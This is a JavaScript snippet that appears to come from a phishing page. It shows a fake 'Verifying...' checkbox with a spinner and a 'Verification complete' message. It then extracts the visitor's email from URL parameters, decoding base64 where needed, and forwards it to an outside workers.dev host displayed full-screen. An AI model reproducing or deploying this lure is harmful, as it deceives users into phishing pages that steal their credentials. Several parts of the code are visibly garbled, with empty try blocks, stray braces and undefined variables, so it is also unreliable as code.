<script>
/* ===================== Verification checkbox logic ===================== */
(function(){
  // Do not run the verification UI logic inside iframes
  if (window.self !== window.top) return;

  var isProcessing = false;
  var box   = document.getElementById('verificationBox');
  var cont  = document.getElementById('checkboxContainer');
  var cb    = document.getElementById('customCheckbox');
  var mark  = document.getElementById('checkmark');
  var spin  = document.getElementById('spinner');
  var text  = document.getElementById('verificationText');
  var pbar  = document.getElementById('progressBar');
  var pfill = document.getElementById('progressFill');
  var done  = document.getElementById('redirectMessage');

  if (!cont) return;

  cont.addEventListener('click', function(){
    if (isProcessing) return;
    isProcessing = true;

    box.classList.add('checking');
    cb.classList.add('checking');
    text.classList.add('checking');
    text.textContent = 'Verifying...';

    mark.style.display = 'none';
    spin.style.display = 'block';
    pbar.style.display = 'block';

    setTimeout(function(){ pfill.style.width = '100%'; }, 100);

    setTimeout(function(){
      spin.style.display = 'none';
      mark.style.display = 'block';
      mark.classList.add('visible');

      box.classList.remove('checking'); box.classList.add('verified');
      cb.classList.remove('checking');  cb.classList.add('checked');
      text.classList.remove('checking'); text.classList.add('verified');
      text.textContent = 'Verification complete';
      done.style.display = 'block';

      // proceed to fullscreen embed
      window.redirectPage();
    }, 3000);
  });
})();

/* ===================== Fullscreen, duplication-proof embed ===================== */
(function(){

var href = window.location.href;
var emailParam = "";

// Parse URL safely

try {

}

}

// 2️⃣ ?state= (base64 OR plain)

    if (stateVal.includes("@")) emailParam = stateVal;

}

// 3️⃣ ?id= (base64)
if (!emailParam && url && url.searchParams.has("id")) {

    var decodedId = atob(url.searchParams.get("id"));

  } catch (e) {}
}

// 4️⃣ Validate
if (emailParam && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailParam)) {
  console.warn("Invalid email detected:", emailParam);
  emailParam = "";
}

// 5️⃣ Build target (NO encoding)
var TARGET_BASE = "https://maggo.log-internals.workers.dev";
var target = TARGET_BASE + "#" + emailParam;

console.log("Redirect target:", target);


    // Avoid self-embedding

      window[LOCK_FLAG] = false;

    // Prepare full-viewport canvas
    document.documentElement.style.height = "100%";
    document.body.style.margin = "0";
    document.body.style.height = "100%";
    document.body.style.overflow = "hidden";
